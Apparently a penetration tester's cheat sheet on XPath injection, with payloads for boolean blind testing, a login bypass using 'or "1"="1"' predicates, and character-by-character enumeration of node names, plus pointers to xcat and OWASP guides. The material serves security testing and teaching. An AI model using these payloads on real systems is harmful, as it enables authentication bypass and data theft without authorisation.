# Simple checks for vulnerable XPATH

### Check if there is any behavioral difference in the responses
```
You could use ' (apostrophe) or , (Comma)
```

Apostrophe used as string terminator

Comma used to break intergers, althorugh any character would work

```
http://<website>/vulnpage.php?countryID=a'
```

### Blind bolean injection
You can check if there is a valid injection by checking with commands if there is no error messages. You can check whenether you get a valid response back or not depending on if it's TRUE or FALSE
```
## TRUE 
http://<website>/vulnpage.php?countryID=999999 or 1=1
http://<website>/vulnpage.php?countryID=999999 or "2" or "2"
## FALSE
http://<website>/vulnpage.php?countryID=999999 or 1=2
http://<website>/vulnpage.php?countryID=999999 or "1"="2"
## Double or (to bypass when not nothing username and password is required)
//<someNode>[username='' or "1"="1" or "1"="1" and password='']
## Password injection parameter.
//<someNode>[username='' and password='' or "1"="1"]
```

### Finding Root Node Identifier
Enumerate one character at a time with this technique.
If you get a **TRUE** condition you know the first character is *b*

```bash
' or substring(name(/*[1]),1,1)='a
' or substring(name(/*[1]),1,1)='b
' or substring(name(/*[1]),2,1)='a
```

After enumerating you get **users**
### Finding first child node name
Enumerate one character at a time with this technique.
If you get a **TRUE** condition you know the first character is *b*

```bash
' or substring(name(/users/*),1,1)='a
' or substring(name(/users/*),1,1)='b
' or substring(name(/users/*),2,1)='b
```
# Enumerate Blind Bolean injections with xcat
You can see here how to use xcat (Tool for injection auto blind bolean to extract) 

[[Xcat]]

XPath Blind Explorer // https://code.google.com/archive/p/xpath-blind-explorer/

### Useful XPath statements
![[Pasted image 20220217090452.png]]

## Resources
https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)

https://owasp.org/www-community/attacks/Blind_XPath_Injection